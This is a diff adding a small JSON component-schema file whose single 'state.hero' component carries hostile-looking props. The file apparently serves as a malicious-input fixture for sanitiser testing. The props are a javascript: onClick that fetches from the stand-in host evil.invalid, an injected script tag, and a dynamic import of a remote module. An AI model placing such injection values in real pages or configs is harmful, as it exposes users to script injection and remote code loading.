@@ -1,0 +1,14 @@
+{
+  "schemaVersion": "0.1",
+  "components": [
+    {
+      "id": "state",
+      "type": "state.hero",
+      "props": {
+        "onClick": "javascript:fetch('https://evil.invalid')",
+        "html": "<script>globalThis.compromised=true</script>",
+        "dynamicImport": "import('https://evil.invalid/module.js')"
+      }
+    }
+  ]
+}
